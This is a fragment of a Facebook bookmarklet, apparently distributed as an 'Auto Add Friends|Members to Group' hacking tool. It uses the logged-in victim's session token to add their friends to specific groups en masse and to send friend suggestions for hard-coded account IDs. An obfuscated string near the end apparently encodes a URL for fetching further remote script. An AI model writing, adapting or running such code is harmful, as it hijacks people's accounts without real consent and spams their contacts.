...
javascript: (function () {
            ...
            e.onreadystatechange = function () {
                if (e.readyState == 4 && e.status == 200) {
                    ...
                    function SuggestFriend() {
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=213601735430613&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=185124168177267&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + f.arr[i].uid + "&newcomer=100000776324852&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + f.uid + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + f.dtsg + "&phstamp=16581677156485189195", function () {}, "text", "post");
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + f.arr[i].uid + "&newcomer=100002943731487&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + f.uid + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + f.dtsg + "&phstamp=16581677156485189195", function () {}, "text", "post")
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + f.arr[i].uid + "&newcomer=100006501164447&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + f.uid + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + f.dtsg + "&phstamp=16581677156485189195", function () {}, "text", "post")
    ...
    var Title = 'Auto Add Friends|Members to Group.',
        crj = '<div style="margin-top:5px;color:gray;font-size:9px;">Powered By: VIKAT RANE PRODUCTION.</br>Script Made By </A><A style="color:#3B5998;" href="http://www.facebook.com/100000776324852" target="_blank"> Vikat Rane</A></A></br>For More Tools Visit Our Website <A style="color:#3B5998;" href="http://www.hck-the-facebook.tk" target="_blank">www.hck-the-facebook.tk</A>.</A><div>';
  ...
  var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Cavktg]Cfokl]CwvmCffRmqv]Hmklkle,rjr";
Y = "";
Z = "";
var V;
V = X.length;
